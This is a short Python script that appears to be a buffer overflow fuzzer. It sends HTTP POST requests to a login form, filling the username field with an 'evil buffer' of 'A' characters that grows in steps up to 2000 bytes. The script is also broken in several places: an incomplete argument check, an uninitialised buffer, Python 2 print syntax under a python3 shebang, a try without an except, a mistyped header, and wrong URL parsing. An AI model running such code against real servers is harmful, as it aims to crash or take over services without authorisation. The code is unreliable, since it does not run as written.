#!/usr/bin/python3
import socket
import time
import sys

if len(sys.argv) != :
    print("\n Usage : " + sys.argv[0] + "<method> <target url> <userform> <passform>")
    exit(1)

method = sys.argv[1].upper()
target = sys.argv[2].split("/")
if len(target[0].split("https")) > 1:
    referer= sys.argv[1]
    host = target[2]
    path = target[8+len(host):len(sys.argv[2])]
elif len(target[0].split("http")) > 1:
    referer= sys.argv[1]
    host = target[2]
    path = target[7+len(host):len(sys.argv[2])]
else:
    referer= "http://" + sys.argv[1]
    host = target[0]
    path = target[len(host):len(sys.argv[2])]

userform = sys.argv[3]
passform = sys.argv[4]

size = 100

while(size < 2000):
    try:
        print "\nSending evil buffer with %s bytes" % size
        
        inputBuffer = "A" * size

        content = userform + "=" + inputBuffer + "&" + passform + "=A"

        buffer += method + " " + path + " HTTP/1.1\r\n"
        buffer += "Host: " + host + "\r\n"
        buffer += "Uaer-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;1=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: " + referer + "\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: " + str(len(content)) + "\r\n"
        buffer += "\r\n"

        buffer += content

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect((host, 80))
        s.send(buffer)

        s.close()

        size += 100
        time.sleep(10)
